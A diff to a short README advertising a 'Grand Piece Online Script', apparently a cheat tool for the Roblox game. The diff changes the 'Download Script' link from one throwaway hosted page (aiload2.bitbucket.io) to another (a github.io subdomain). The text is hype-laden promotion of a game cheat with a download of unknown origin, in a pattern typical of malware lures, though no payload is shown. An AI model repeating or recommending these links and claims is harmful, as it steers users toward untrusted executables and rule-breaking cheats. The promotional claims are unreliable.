@@ -2,7 +2,7 @@
 
 **Ahoy, adventurers!** Tired of the grind in Grand Piece Online? Ready to dominate the seas without breaking a sweat? The Grand Piece Online Script is your treasure map to effortless success.
 
-[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://aiload2.bitbucket.io/)
+[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://Grand-Piece-Online-Script-gydol.github.io/.github)
 ---
 
 ## 🚀 What is the Grand Piece Online Script?
